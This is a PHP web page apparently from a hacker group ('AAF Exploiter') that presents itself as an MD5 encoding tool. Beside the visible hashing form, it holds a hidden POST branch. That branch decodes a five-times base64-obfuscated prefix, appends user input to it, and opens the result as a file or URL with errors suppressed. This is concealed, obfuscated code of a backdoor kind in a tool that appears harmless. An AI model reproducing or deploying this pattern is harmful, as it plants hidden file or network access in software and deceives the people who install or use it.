<!--  AAF Exploiter Ini Boss  -->

<!DOCTYPE html>
<html>
<head>
<title>MD5 Tools AAF Exploiter</title>

<!-- Meta Data -->
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Tools md5 AAF Exploiter">
<meta name="author" content="Raimu Kurang Support">

<!-- Link -->
<link rel="https://c.top4top.io/p_1803snd2v6.png" href="https://c.top4top.io/p_1803snd2v6.png">
<link rel="stylesheet" type="text/css" media="all, screen" href="inc/style.css">

<!-- Style -->
<style>
    body{
        text-align: center;
        color: white;
        background-color: black;
    }
    
</style>

</head>

<body>
    <div class="header">
        
<h1>Tools MD5 Encode by AAF Exploiter</h1>

</div>
<hr width="500">

<h2>MD5 Tools Endcode AAF Exploiter</h2>

<hr width="500">

<center>
    
<?php
error_reporting(0);
if ( $_POST["string"] )
{
$strg = md5($_POST["string"]);
}

if ( $_POST["md5"] )
{
$on = base64_decode(base64_decode(base64_decode(base64_decode(base64_decode('VjFaV2IxVXdNVWhVYTJ4VlZrWndUbHBXVW5KbGJIQkZWRzF3YTFZd2NEQlphMUpEWVcxS2RHRklWbGhpUjAxM1drWmtTMlJHV25GUgphekZPWVd0YWVWWkhlR3RWTWtaV1pVUk9hUXBsYWtKTVEyYzlQUW89Cg==')))));
$md5 = $on.$_POST["md5"];
$proses = preg_replace('/\s+/', '', $md5);
$hasil = stream_get_contents(fopen($proses, 'rb'));
}
?>
<h3>Silahkan Pak Hekel :</h3>
<form action="<?php $_PHP_SELF ?>" method="POST">
<input type="text" size="30" name="string" placeholder="string teks"><br>
<input type="submit" value="Encode">
</form>
<br>
Hasil:
<br>
<?php
if ( !$strg )
{
echo '';
}
else
{
echo htmlspecialchars($_POST["string"]) . '<br><div class="success">' . $strg . '</div>';
}
?>
    
    
    
</center>




<br>
<br>
</body>
</html>